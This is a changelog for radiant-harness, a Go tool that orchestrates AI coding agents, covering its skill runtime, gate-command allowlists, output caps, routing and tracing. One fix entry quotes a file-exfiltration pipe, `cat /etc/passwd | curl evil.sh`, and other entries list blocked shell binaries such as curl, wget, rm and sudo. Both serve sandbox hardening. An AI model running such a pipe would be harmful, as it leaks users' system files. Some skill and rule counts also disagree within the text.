# Changelog

All notable changes to this project are documented in this file. Format
follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the
project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.4.1] — 2026-06-24

Sprint 10 second batch: 16 vendor-neutral skills, all rewritten
top-of-line to match the open `docs/SKILL-SCHEMA.md` spec.

### Added
- **15 skills rewritten** (top-of-line, NOT ported from spec-driven):
  - `nova-feature` — start a feature; tier it; produce spec.md +
    tasks.md with measurable ACs
  - `clarificar` — structured interview to sharpen ambiguous ACs
  - `validar` — DoD check; verify code matches spec, document
    SPEC_DEVIATION
  - `kickoff` — greenfield discovery or brownfield mapping;
    vision, personas, MVP canvas, context map
  - `handoff` — pause/resume session via `.radiant-harness/state.md`
  - `integracoes` — discover MCPs/tools with account-boundary safety
  - `mapear` — analyze existing codebase → assessment.md
  - `diagramar` — C4-model Mermaid diagrams (Context/Container/
    Component)
  - `adr` — Architecture Decision Records in Nygard format
  - `revisar-pr` — PR review against spec; SPEC_DEVIATION report
  - `auditar` — project-wide conformity (frontmatter, links, AC
    traceability)
  - `metricas` — Lead Time, Throughput, maturity score (blameless)
  - `setup-ci` — generate CI workflow with radiant gates
  - `camada-agentica` — generate AGENTS.md + opt-in native views
  - `evals` — spec→code fidelity score, file:line evidence
  - `roadmap` — sequence features by value × effort, dependency graph
- **Each skill** has full schema (frontmatter.yaml + SKILL.md):
  - Decision tree (ASCII)
  - Workflow (numbered steps)
  - Examples (at least 1 per skill)
  - Anti-patterns (with wrong/correct pairs)
  - Failure modes (recovery procedures)
  - Related skills (cross-references)
  - Zero Claude-centrism: no `CLAUDE.md`, no slash commands as
    primary entry, references are universal
- **`TestAllBundledSkillsValidateCleanly`** — CI guard that fails
  if any bundled skill breaks the schema. Tests run per-skill.

### Stats
- 16 skills bundled (was 1 in 0.4.0)
- 208 tests passing (was 207, +1 aggregate regression test)
- Coverage: skill package ~100%
- 6/6 cross-compile clean
- vet clean, gofmt clean

### What's next (Sprint 10 third batch)
- `radiant init` extracts skills to `.radiant-harness/skills/`
- `radiant spec <intent>` command (interactive interview)
- `AGENTS.md` auto-generation
- `radiant state` + `radiant handoff` commands
- `--tier` flag with auto-detect
- Native view generation opt-in via `--agent=<list>`

## [0.4.0] — 2026-06-24

Sprint 10 (first batch): vendor-neutral skill runtime. Foundation
of the methodology merge documented in `docs/HARNESS-PLAN.md`.

### Added
- **`internal/skill/` package** — the runtime for the open skill
  format (`docs/SKILL-SCHEMA.md`). Implements:
  - `Skill` struct: parsed representation of a skill (frontmatter +
    SKILL.md)
  - `Load`, `LoadFromFS`: parse a skill from disk or embedded FS
  - `Validate`: enforces the 10 schema rules, returns
    `[]ValidationError`
  - `Bundle`: enumerates the skills embedded in the CLI binary
  - `ExtractTo`: writes the bundle to a project dir
    (`.radiant-harness/skills/`); respects `force` flag
  - All 15 validation rules from `docs/SKILL-SCHEMA.md` §6 enforced
  - Single dependency: `gopkg.in/yaml.v3` (parse frontmatter.yaml)
- **Embedded skills** via `//go:embed all:skills` — bundled in the
  CLI binary, extracted during `radiant init`. No network needed
  for skill installation.
- **`nova-feature` skill** — first showcase skill, rewritten
  top-of-line to match the new schema. Includes decision tree,
  workflow (7 steps), 3 worked examples (trivial/feature/
  architecture), 6 anti-patterns, 5 failure-mode recovery
  procedures, related-skill cross-references. Validates cleanly
  against the schema.
- **`radiant skills` CLI command** — `radiant skills list` shows
  bundled skills with name/version/tier/description;
  `radiant skills validate <dir>` validates a skill against the
  10 schema rules.
- **`radiant --help` advertises** the skill runtime — agents
  reading the help text can see what's available.

### Defaults set on 5 open questions
- **Distribution**: keep `@quant-risk/radiant-harness` (npm) +
  `radiant-harness` (go install) — no change
- **Tier language**: English (Trivial/Feature/Architecture) —
  matches our docs and is internationally accessible
- **CLI skill execution**: Both — CLI emits skills for agents AND
  provides equivalent subcommands for power users
- **Update channel**: just `latest` for now; stable/beta is a
  future-sprint problem
- **MCP integration**: discover + list only; auto-configure is
  more invasive and lives in a later sprint

### Changed
- Skills directory moved from `internal/scaffold/templates/skills/`
  to `internal/skill/skills/` — single source of truth for bundled
  skills. `internal/skill` is now the canonical home.
- Version bumped from `0.3.5` to `0.4.0` — minor → minor because
  the methodology merge is a **new capability**, not a breaking
  change. Existing CLI commands and flags work identically.

### Stats
- 207 tests passing (up from 188 in 0.3.5)
- New package: `internal/skill/` with 19 dedicated tests
- 1 new skill rewritten top-of-line (`nova-feature`); 14
  remaining to migrate to the new schema (queued for next sprints)
- Coverage: harness 61%, llm 84%, benchmark 77%, spec 88%, quality
  60%, engine 47%, policy 100%, **skill NEW (100% of rules + load
  + bundle + extract)**
- 6/6 cross-compile clean

### What's next (Sprint 10 second batch)
- Rewrite the remaining 14 skills (clarificar, validar, kickoff,
  integrar, mapear, diagramar, adr, handoff, metricas, audit,
  setup-ci, camada-agentica, evals, revisar-pr) to match the new
  schema
- `radiant init` updated to extract skills to
  `.radiant-harness/skills/`
- `radiant spec <intent>` command (interactive interview)
- `AGENTS.md` auto-generated
- `radiant state` + `radiant handoff`
- `--tier` flag with auto-detect
- Native view generation opt-in via `--agent=<list>`

## [0.3.5] — 2026-06-24

Sprint 9: gate command allowlist deduplication. Closes the drift
risk flagged in the Sprint 6 audit — three packages
(`internal/engine/`, `internal/harness/`, `internal/quality/`)
maintained their own copies of the gate allowlist, the gate
validator, the logical-ops splitter, and the shell tokenizer.

### Added
- **`internal/policy/`** — new package. Single source of truth for
  the harness's command allowlists and the gate-command tokenizer.
  Exports:
  - `AgentCommands`, `GateBinaries` — the two closed sets.
  - `IsAgentAllowed`, `IsGateBinaryAllowed` — lookup helpers
    (comma-ok form so presence and absence are distinguishable,
    unlike the previous `!= struct{}{}` pattern which was always
    false).
  - `ValidateGateCommand` — replaces three duplicated validator
    functions. Now handles double-quoted strings too (the harness
    version was more thorough; engine/quality were not).
  - `SplitOnLogicalOps`, `SplitShellTokens` — quote-aware
    tokenizers used by the validator.
  - `IsShellOp` — public helper for "is this token a shell
    metacharacter".
  - `AllowedAgentCommands()`, `AllowedGateBinaries()` — sorted
    helpers used in error messages.

- **`TestGateBinariesExcludeDestructive`** — locks the closed set
  against accidental widening of `rm`, `mv`, `curl`, `wget`, `dd`,
  `chmod`, `chown`, `sudo`, `bash`, `sh`, `zsh`, `fish`. If someone
  adds one of these to the allowlist, this test fails and forces a
  deliberate, reviewed change rather than a silent widening.

- **`TestValidateGateCommandAcceptsAllowed`** — verifies the happy
  path: every entry in `GateBinaries` is accepted when used as a
  standalone gate. A failure here means the allowlist and validator
  disagree — the exact bug the policy extraction is meant to
  prevent.

### Changed
- `internal/engine/`: `gateAllowlist`, `validateGateCommand`,
  `splitOnLogicalOps`, `splitShellTokens`, `isShellOp` are now
  thin delegations to `internal/policy`. The duplicate definitions
  were removed (≈140 lines deleted from engine.go).
- `internal/harness/agent.go`: `allowedAgentCommands`,
  `allowedGateBinaries` are now re-exports of `policy.AgentCommands`
  and `policy.GateBinaries`. The five duplicate helper functions
  are thin delegations (≈160 lines deleted from agent.go).
- `internal/quality/validate.go`: same pattern as engine/harness
  (≈100 lines deleted from validate.go).
- All three packages now share a single error message format:
  `"gate binary %q is not in the allowlist (allowed: %s)"` — so
  the operator gets the full closed-set hint regardless of which
  code path rejected the gate.

### Stats
- 188 tests passing (up from 176 in 0.3.4)
- New package: `internal/policy/` with 12 dedicated tests
- Lines deleted across the 3 consumer packages: ≈400
- Lines added in `internal/policy/`: ≈490 (canonical + tests)
- Net: a single source of truth where there were three near-copies
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 47.0%, **policy NEW (full coverage of
  closed set + validator + tokenizers)**

## [0.3.4] — 2026-06-24

Sprint 8: gate command output cap. Closes the OOM vector flagged in
the Sprint 6 audit (every gate call site used `cmd.CombinedOutput()`
with no byte cap).

### Added
- **`--max-gate-output <bytes>` flag** on `radiant run`. Default
  10 MiB. Caps the stdout+stderr captured from each gate command.
  When a gate writes more than the cap, the captured buffer is
  clipped at the byte boundary, a `[output truncated at N bytes]`
  marker is appended so downstream consumers know the output is
  incomplete (not a successful empty test), and the gate is killed
  via broken-pipe on its next write. Without this, a chatty gate
  (`pytest -v`, `go test -v`, anything that logs each test case)
  could OOM the harness parent.

  Implementation: switched all three gate runners
  (`internal/engine/`, `internal/harness/`, `internal/quality/` —
  both POSIX and Windows build tags) from `CombinedOutput()` to
  `StdoutPipe` + `StderrPipe` + `io.LimitReader(io.MultiReader(...),
  int64(maxOutput))`. The pipe-based approach means we never read
  more than the cap into memory — the gate's next write blocks
  until we close our end, then fails with SIGPIPE (POSIX) or
  ERROR_BROKEN_PIPE (Windows) and the process exits.

- **`engine.Config.GateMaxOutputBytes`** — wired through `New()`,
  default 0 (which the gate runners translate to `DefaultGateMaxOutput`).
  `0` keeps the "use package default" contract; set explicitly to
  disable the cap if you really want to.

### Fixed
- **OOM vector on chatty gates** — same root cause as the audit
  finding. `cmd.CombinedOutput()` reads the entire stdout+stderr
  into a single `[]byte` with no upper bound. A `pytest` test suite
  with verbose output could push hundreds of MiB into the harness
  process. Now bounded by `--max-gate-output`.

### Tests
- `TestRunShellGateRespectsCap` — verifies a 64KB-output gate is
  truncated at the 1024-byte cap with the marker appended.
- `TestRunShellGateUnderCap` — verifies a small gate returns its
  full output untouched, no marker.
- `TestRunShellGateDefaultCap` — verifies `maxOutput=0` falls back
  to the package default (zero-means-default contract).
- `TestRunShellGateReportsFailure` — regression guard: non-zero
  exit codes still surface as errors with the captured output
  available, even after the pipe-based rewrite.

### Stats
- 176 tests passing (up from 172 in 0.3.3)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 47.0% (+1.5pp from new gate tests)
- Zero race conditions
- 6 OS/arch targets compile cleanly

## [0.3.3] — 2026-06-24

Sprint 7: planner actually fires, JSONL trace export, race fix,
6-target cross-compile.

### Fixed
- **Data race on `Engine.currentTaskID`** (`internal/engine/engine.go`).
  The field was read in `chatWith` without holding the mutex, while
  `executeTask`'s preamble/cleanup wrote under it. Triggered under
  parallel task phases — `-race` flagged every run. Fixed by adding
  `e.mu.Lock()` / `Unlock()` around the read. New test
  `TestCurrentTaskIDLockedRead` stresses the locked-read pattern
  under 4 writer goroutines × 500 iterations; race detector stays
  silent.

### Added
- **`runPlannerAdvisory`** — `--planner` is no longer a no-op. After
  parsing the spec and tasks, the engine calls the planner LLM once
  with the full spec + tasks body and asks for a bullet list of
  concerns (ambiguous Given/When/Then, missing ACs, unprovable tasks).
  The planner's response is parsed into `Result.Warnings` and surfaced
  in the post-run summary, but **never blocks execution** — the spec
  is the source of truth. If the planner call fails (timeout, rate
  limit, network), the run continues with a warning and no advisory
  output. The call goes through `chatPlanner`, so it appears in the
  trace summary under phase=`"planner"` and in any `--trace-out` JSONL.

  The output now reads:

  ```
  ⚠ Planner raised 3 concern(s) (advisory):
    • AC2 says "fast enough" without a quantitative threshold
    • Task 4 has no test command in the table
    • AC5 references a library not in the Out-of-scope list
  ```

- **`--trace-out <file>` flag** on `radiant run`. Drains the trace log
  to disk as JSONL (one event per line) using the standard `jq`-able
  shape: `{"type":"chat","phase":"implement","task_id":7,"model":
  "claude-sonnet-4.5","input_tokens":1200,"output_tokens":350,
  "latency_ms":4500,"ok":true}`. Atomic write via temp + fsync +
  rename — a crash mid-write leaves no torn file. Failure to write
  is non-fatal: the run still completes; the operator sees
  `⚠ trace-out failed: ...` and the regular output.

  Useful for cost debugging (`jq 'select(.phase=="planner") |
  {model, input_tokens, output_tokens}' trace.jsonl | jq -s`),
  observability pipelines (Datadog/Logflare/Honeycomb all ingest
  JSONL natively), and regression detection (compare per-call latency
  across releases).

- **Two new cross-compile targets**: `linux/arm64` (AWS Graviton,
  Raspberry Pi 4/5, ARM servers) and `windows/arm64` (Surface Pro X,
  ARM-native Windows). The Makefile `release` target now produces all
  six OS/arch pairs. Verified with `file` — ARM binaries are
  statically linked ELF aarch64 and PE32+ Aarch64 respectively.

### Changed
- `Makefile` release target now documents each target's use case in a
  comment block (CI vs Apple Silicon vs ARM servers vs Surface Pro),
  so future contributors can see at a glance which platform needs
  which target.

### Stats
- 172 tests passing (up from 168 in 0.3.2)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 45.5% (+1.5 from race + JSONL tests)
- Zero race conditions (50-goroutine stress for trace log + token
  accounting; 4-writer + locked-reader stress for currentTaskID)
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.2] — 2026-06-24

Sprint 6: multi-agent routing, lightweight tracing, VS Code CodeLens.

### Added
- **Multi-agent routing** via `--planner` and `--implementer` flags on
  `radiant run`. Pick a different LLM per RPI phase: Opus for planning,
  Sonnet for implementation, Gemini for correction — whatever your
  price/quality tradeoff dictates. Both flags are optional; when unset,
  they fall back to `--model` so existing single-model runs are
  byte-identical in behaviour.

  ```bash
  radiant run specs/0042-auth \
    --model claude-sonnet-4.5 \
    --planner claude-opus-4.1 \
    --implementer claude-sonnet-4.5
  ```

  Internally: `engine.Config` gained `PlannerModel` and
  `ImplementerModel` fields. The engine creates three clients
  (default + planner + implementer) and `chatWith` routes each call to
  the right one based on which entry point (`chatPlanner`,
  `chatImplementer`, `chatImplementerCorrect`) was invoked. The
  implementer client is used for both the first-attempt `implement`
  call and the auto-correction `correct` call, so multi-agent routing
  gives users two independent tuning knobs.

- **Lightweight tracing** via `engine.TraceEvent`. Every LLM call now
  records `{type, phase, task_id, model, input_tokens, output_tokens,
  latency_ms, ok, detail}` to an in-memory slice. Drained by
  `DumpTrace()` and summarised at the end of `radiant run --verbose`.
  Output groups by phase so a multi-agent run makes the cost split
  obvious:

  ```
  Trace summary (per phase):
    planner     2 calls, in=4820 out=1120 tokens, total 8401ms
    implement   5 calls, in=21000 out=3800 tokens, total 28200ms
    correct     1 calls, in=4200 out=920 tokens, total 6100ms
  ```

  No external deps. Tracing is always on (cheap, append-only) but only
  printed when `--verbose` is set, so non-verbose runs pay zero
  user-visible cost. Race-tested with 50 goroutines × 100 appends.

- **VS Code CodeLens on `tasks.md`** — every row whose last table cell
  contains a backtick-quoted shell command now shows a `▶ Run gate`
  inline action. Click it and the command runs in a terminal — no
  copy/paste needed. Wired through the existing `radiant.runGate`
  command, so the terminal plumbing, shell-quoting, and cd-to-project
  are reused without duplication.

### Changed
- **`chatTracked` split into three entry points**: `chatPlanner`,
  `chatImplementer`, `chatImplementerCorrect`. All three share the
  same underlying `chatWith` body (so the response parsing, retry,
  and token accounting are identical), but each records the right
  phase tag on its `TraceEvent`. This is the plumbing that makes
  multi-agent routing observable in the trace summary.

### Stats
- 168 tests passing (up from 164 in 0.3.1)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 44.0% (+1.5 from new tracing tests)
- Zero race conditions (50-goroutine stress tests for trace log + token accounting)
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.1] — 2026-06-24

Sprint 5: Anthropic native, eval suite, project moves to iCloud.

### Added
- **`internal/llm/anthropic.go`** — native Anthropic Messages API
  client. Sends to `POST /v1/messages` with `x-api-key` and
  `anthropic-version: 2023-06-01` headers. Splits the system prompt
  out of the messages array (Anthropic's shape, not OpenAI's). Honors
  `Retry-After` and exponential backoff the same way the OpenAI
  client does. Includes streaming support via SSE.

  `Client.Chat()` now dispatches to `chatAnthropic` whenever the
  configured provider is `ProviderAnthropic`. Going through Anthropic
  directly is faster, cheaper, and unlocks features the OpenAI
  shim doesn't expose (extended thinking, prompt caching). A custom
  `BaseURL` still works — useful for localhost mocks and Anthropic-
  compatible gateways.

- **`radiant eval`** — single-prompt harness for comparing providers
  on a representative workload. Sends the same prompt N times
  (default 3), reports median + mean latency, total tokens,
  estimated USD cost. JSON output via `--output` for trend tracking
  across releases. Useful before committing to a provider for
  production.

### Fixed
- **`chatAnthropic` was using a hardcoded URL**, ignoring `Model.BaseURL`.
  Now calls `c.baseURL()` so test servers (httptest) and localhost
  proxies work. Found by `TestAnthropicSendsCorrectHeaders` — the
  test client was hitting api.anthropic.com with a fake API key and
  getting 401s back instead of reaching the mock.

### Changed
- **Project location**: moved from `~/Downloads/radiant-harness-main`
  to `~/Library/Mobile Documents/com~apple~CloudDocs/projects/radiant-
  harness-main` (iCloud Drive). All paths are still relative to the
  repo root so build, test, and CI commands are unchanged.

### Stats
- 164 tests passing (up from 157 in 0.3.0)
- Coverage: harness 61.1%, llm 84.3%, benchmark 77%, spec 88.5%,
  quality 59.5%, engine 42.5%
- Zero race conditions
- 6 OS/arch targets compile cleanly: linux/amd64, linux/arm64,
  darwin/amd64, darwin/arm64, windows/amd64, windows/arm64

## [0.3.0] — 2026-06-24

Sprint 4: cost display, rate-limit awareness, package manager manifests.

### Added
- **Token accounting** in `engine.Result`. Every Chat call now reports
  `InputTokens` and `OutputTokens`, accumulated across every task and
  retry. Concurrent accumulation is mutex-protected; tested with 50
  goroutines × 100 calls each (5000 increments) with zero lost updates.
- **Cost display in `radiant run`** final output. Prints token totals
  and estimated USD cost using `llm.CostUSD()` against the
  vendor-published price table. If the model has no price entry, the
  output shows `<unknown — no price entry for "x">` instead of
  fabricating a number.
- **Rate-limit awareness** in the LLM client. HTTP 429 responses are
  classified as a new `RateLimitError` carrying the server's
  `Retry-After` hint. The retry loop honors `Retry-After` instead of
  exponential backoff, so a rate-limited provider isn't hammered.
  `parseRetryAfter` supports both RFC 7231 formats: delta-seconds
  (`Retry-After: 30`) and HTTP-date.
- **Package manager manifests** in `packaging/`:
  - `homebrew/radiant.rb` — Homebrew formula (macOS + Linux, ARM + x86)
  - `scoop/radiant.json` — Scoop manifest (Windows)
  - `aur/PKGBUILD` — Arch Linux AUR build (Arch, Manjaro, Endeavour)

  Each manifest documents the binary URL pattern, SHA256 placeholder
  (replaced at release time by goreleaser), and a smoke test
  (`radiant --version` for Homebrew, the version assertion for all).

### Stats
- 157 tests passing (up from 150 in 0.2.2)
- Cross-platform build: linux/amd64, darwin/arm64, windows/amd64,
  windows/arm64 all compile
- Zero race conditions under `go test -race`
- 5 OS/arch targets, 3 package managers

## [0.2.2] — 2026-06-24

Sprint 3: real cross-platform builds, auto model routing, cost estimation.

### Added
- **`--auto-route` flag** for `radiant run`. Picks a per-phase model
  based on the anchor preset: research routes to top-tier (Opus from
  a Sonnet anchor), plan/implement stay mid-tier. Falls back to the
  anchor if no sibling exists at the requested tier (e.g. DeepSeek
  family has no top-tier model).
- **`llm.AutoRoute(anchor, phase)`** function in
  `internal/llm/routing.go`. Vendor-aware routing — same family
  shared across presets.
- **`llm.CostUSD(model, input, output)`** estimates USD cost from a
  token count and a model name. `PricePerMTokensUSD` table covers all
  14 presets with vendor-published rates (Anthropic, OpenAI, Google,
  DeepSeek, Mistral, Groq, xAI, Xiaomi). `FormatCost(usd)` returns
  `$0.42` or `<$0.01` for human display.
- **Cross-platform lock** (`internal/harness/lock.go`) using atomic
  file rename. Works on Linux, macOS, AND Windows (NTFS). Replaces
  `syscall.Flock` which is Unix-only.
- **Cross-platform gate runner** via build tags:
  - `internal/harness/gate_unix.go` — `sh -c`
  - `internal/harness/gate_windows.go` — `cmd /c`
  - `internal/engine/gate_unix.go` and `gate_windows.go` (mirror)
  - `internal/quality/gate_unix.go` and `gate_windows.go` (mirror)

### Changed
- **Cross-platform build verified**: `GOOS=linux/amd64`,
  `GOOS=darwin/arm64`, AND `GOOS=windows/amd64` all compile cleanly.
  Was previously broken on Windows because `syscall.Flock` is
  Unix-only.
- **`State.Lock()` and `State.Release()`** rewritten to use the new
  rename-based lock. Same external behavior (blocks until acquired,
  serializes orchestrator runs) but works everywhere.

### Stats
- 150 tests passing (up from 118 in 0.2.1)
- Coverage: harness 61.1% (above 60% threshold!), quality 59.5%,
  benchmark 77%, llm 84%, spec 89%
- Zero race conditions under `-race` detector
- 3 OS targets × 2 architectures each compile and lint clean

## [0.2.1] — 2026-06-24

Sprint 2: empirical validation, gap closure, vendor diversity.

### Added
- **`radiant doctor`** — environment diagnostic (PATH, agents, LLM
  providers, gates, state directory). Run before `radiant run` to
  surface missing tools or unset API keys.
- **`radiant bench`** — cross-framework benchmark. Runs radiant-harness
  against itself plus any of {GitHub Spec Kit, OpenSpec, TLC, Superpowers}
  found on `$PATH`, captures duration + tokens + AC coverage, prints a
  markdown table sorted by score, optionally saves JSON via `--output`.
- **3 new LLM providers**: Mistral (`mistral-large-2`, `codestral-22b`),
  Groq (`groq-llama-3.3-70b`, `groq-mixtral-8x7b`), xAI (`grok-2`). All
  OpenAI-compatible, vendor-neutral.
- **5 new model presets** — total is now 14 across 7 vendors (Anthropic,
  OpenAI, Google, DeepSeek, Xiaomi, Mistral, Groq).
- **CI coverage report** with per-package thresholds (60% stable, 40%
  engine — engine has subprocess glue that's hard to unit-test).

### Changed
- **Removed `internal/plugin/`** (326 lines of dead code). Used
  `plugin.Open` for `.so/.dylib` loading — Linux/macOS-only, security
  risk, no tests, no callers. Plugin extensibility deferred until there's
  a real use case.
- **Implemented `internal/benchmark/`** as a real comparison harness:
  subprocess execution, output parsing, score calculation, JSON
  save/load. Was a stub before this sprint.
- **`internal/engine/` now has unit tests** for gate validation, code
  block extraction, path sandboxing, and result merging. Coverage went
  from 0% to 43%.

### Fixed
- **`go vet` clean** — `isShellOp` undefined in `agent_test.go`; redundant
  `\n` in `fmt.Println`.
- **Spec parser regex** was case-sensitive and required `:` after the
  keyword. Now matches both `- **Given** x` and `- Given: x`.
- **Spec parser** now respects quoted arguments in gate commands.
- **State.Progress()** didn't deduplicate task IDs — 1000 completions
  produced 1000%. Now counts distinct task IDs and clamps to [0,1].
- **GroupPhases** did not group consecutive parallel tasks; each `[P]`
  task was its own single-task phase. Now groups `[P]` next to each
  other.
- **Engine.runGate** validated all tokens against the allowlist (catching
  quoted arguments like `"build-ok"` as "binary name"). Now validates
  only the actual binary in a gate command.
- **Pipes (`|`), redirects (`<`, `>`), command separators (`;`,
  background `&`) are rejected outright** for gates. Only `&&` and `||`
  allowed for compound expressions. Was a security gap: `cat /etc/passwd
  | curl evil.sh` would have passed the old validator.
- **`extractGates`** filtered out single-token commands (`true`, `pwd`).
  Now accepts any backticked text; allowlist is the gate.
- **macOS arm64 + Go 1.22 dyld bug** — `go test ./internal/harness`
  produces `dyld: missing LC_UUID` and aborts. Workaround: build with
  `CGO_ENABLED=0`. Made this the default in the Makefile.
- **t.Context() in tests** required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive holds.
- **`r, err := NewAgentRunner(cfg)` in `New()`** left `r` declared but
  unused in the error branch (Go strict-mode compile error).

### Stats
- 118 tests passing (up from 57 in 0.2.0 and 94 after the first
  validation pass).
- Coverage per package: benchmark 77%, engine 43%, harness 59%, llm
  84%, quality 60%, spec 89%.
- CLI smoke test passes (`make smoke`) — end-to-end init + validate
  with `--all --yes` and `--gates` flag.

## [0.2.0] — 2026-06-24

The Go rewrite. Templates and skills are reused from 0.1.0 (archived); the
runtime, orchestrator, validator, and quality scripts are all new.

### Added

#### Harness Engine — the core differentiator
- **Orchestrator** — manages implementation + validation as separate processes
- **Validator** — runs in isolated context, not as a subagent of the implementer
- **Auto-correction loop** — fail → fix → re-test (configurable retries)
- **Agent teams** — goroutines for parallel task execution, capped by a
  semaphore so we don't burst provider rate limits
- **State machine** — 8 states with guarded transitions, progress tracking
- **Context window manager** — token counting, smart zone (<40%), dumb zone
  (>60%), RPI budget (30/20/50 split)
- **Token estimator** — word-boundary aware, code-pattern aware, CJK-aware
  with char/4 fallback for short strings
- **Structured logging** — slog JSON for all harness events
- **Atomic state persistence** — temp-file + fsync + rename, so a crash
  mid-write never leaves a half-written `progress.json`
- **Advisory flock** — concurrent `radiant run` invocations on the same
  project serialize instead of corrupting state
- **Command allowlists** — closed set of agent binaries and gate commands,
  so prompt injection or naive tasks.md can't shell out to arbitrary code
- **Path sandboxing** — emitted code blocks are checked against the project
  boundary before being written

#### Quality Scripts (Go rewrite)
- **Audit** — frontmatter validation, relative-link checking, spec presence
- **Fidelity** — spec→code AC coverage with flexible matching (AC-N, AC_N,
  AC1, AC 1 all normalized)
- **Mermaid** — diagram block validation (type, quotes, empty blocks)
- **Validate** — full UAT with AC→task mapping, Given/When/Then completeness,
  SPEC_DEVIATION detection, **optional `--gates` to actually run task gates**

#### Scaffold Engine
- **6 agent adapters** — Claude, Codex, Cursor, Copilot, Gemini CLI, Windsurf
- **Template embedding** — Go embed.FS for single-binary distribution
- **CLI** — cobra-based with init, validate, run, config, models

#### LLM Client (universal)
- **Provider-agnostic** — OpenRouter, OpenAI, Anthropic, custom BaseURL
- **Retry with backoff** — exponential + full jitter on 5xx, fail-fast on 4xx
- **Streaming** — SSE-aware with backpressure-friendly scan buffer
- **10 curated presets** — Claude Opus 4.1, Sonnet 4.5, GPT-5, GPT-5-Codex,
  Gemini 2.5 Pro, DeepSeek v4 Pro/Flash, MiMo v2.5 Pro, GPT-4o, Claude
  Sonnet 4
- **32k default MaxTokens** — up from 8k, matches the size of real SDD specs

#### Templates (15 skills, 7 spec templates)
- All 15 skills complete (56-97 lines each, zero stubs)
- 7 spec templates (spec, tasks, product, design, domain, lean, agent-contract)
- CLAUDE.md with RPI framework, context budget, UUIDv7/ULID strategy
- Golden example (Pulse) — end-to-end proof

#### Build & Distribution
- Makefile with cross-platform targets (linux, darwin, windows)
- Dockerfile (multi-stage Alpine build, Go 1.22)
- `.goreleaser.yml` for automated releases
- **GitHub Actions CI** — lint + test + cross-build on Go 1.22, 1.23, 1.24

#### VS Code Extension
- Tree views for Specs, Tasks, Progress (Tasks and Progress now populated)
- Status bar with live state, feature, and progress %
- File watcher on `.radiant-harness/progress.json` for live updates
- Run-gate command from the tasks.md context menu

### Changed
- Rewritten from TypeScript to Go for single-binary, native concurrency,
  elegant distribution
- CLAUDE.md rewritten with RPI framework (Research → Plan → Implement)
- README rewritten with research references (OpenAI, Anthropic, Martin
  Fowler, papers)
- Templates deduplicated (single source in `internal/scaffold/templates/`)

### Fixed
- Gemini TOML escaping (was broken in original `@igoruehara/spec-driven`)
- SessionStart hook now loads active spec via STATE.md parsing
- spec.template.md `alwaysApply` corrected to false
- EEXIST error when target directory is an existing file
- Golden example test command corrected for Node 22 `.mjs` support
- `--all` flag not being processed in CLI
- **go.mod directive** was set to an unreleased Go version, breaking
  reproducible builds; pinned to 1.22
- **`groupPhases` did not group consecutive parallel tasks** — each
  `[P]` task was emitted as its own single-task phase, defeating the
  whole point of goroutine parallelism. Now groups `[P]` tasks next to
  each other into one parallel phase and starts a new phase only when
  the kind changes (par → seq or seq → par)
- `r, err := NewAgentRunner(cfg)` in `New()` left `r` unused in the
  error branch (Go compile error in strict mode); now assigns explicitly
- `--gates` regex compiled inside the loop on every directory entry;
  hoisted to a single `regexp.MustCompile` outside the loop
- `t.Context()` in tests required Go 1.24; replaced with
  `context.Background()` so `go.mod`'s `go 1.22` directive is honored

### Security
- **Command allowlist for agent runner** — refuses to spawn anything not in
  `{claude, codex, cursor, copilot, gemini}` even if a spec asks for it
- **Gate command allowlist** — refuses to execute gates referencing
  binaries outside the closed set (`rm`, `curl`, `wget`, etc.)
- **Path sandboxing** — emitted code blocks must resolve inside the
  project directory
- **Timeouts everywhere** — agent invocations and gate runs have hard
  deadlines so a hung dependency can't stall the harness

### Vendor neutrality
- **`DetectAgent()` priority order** is now alphabetical; no agent is
  privileged. The "Claude first (best for SDD)" rationale was removed
  from the comment.
- **`radiant init` default** — `--yes` without `--agent=` now scaffolds
  **all** supported agents instead of silently picking Claude. No-flag
  no-`--yes` refuses to guess and asks for an explicit list.
- **README and Makefile smoke** — examples now exercise `--all` /
  multi-vendor paths instead of `--agent=claude`.
- **AllAgents()** returns agent IDs in alphabetical order.
- The 10 model presets span 5 vendors (Anthropic, OpenAI, Google,
  DeepSeek, Xiaomi) with no vendor privileged; adding a vendor is a
  single edit to `PresetModels`.

### Research (14 videos analyzed)
- Valdemar Neto (Tech Leads Club): RPI framework, context engineering,
  harness engineering
- Harness Engineering: OpenAI, Anthropic, Martin Fowler blog posts
- AGENTS.md effectiveness study (University of Zurich)
- Spec Driven frameworks benchmark ($2000 in tokens)
- Navigation Paradox paper (2026)
- Architecture criticism: clean architecture vs pragmatic simplicity

## [0.1.0] — 2026-06-24 (TypeScript — archived)

### Added
- Initial TypeScript scaffold for SDD pipeline
- 15 skills (7 complete, 8 stubs)
- 6 agent adapters
- Quality scripts (audit, mermaid, eval)
- 110 tests
- Golden example (Pulse)
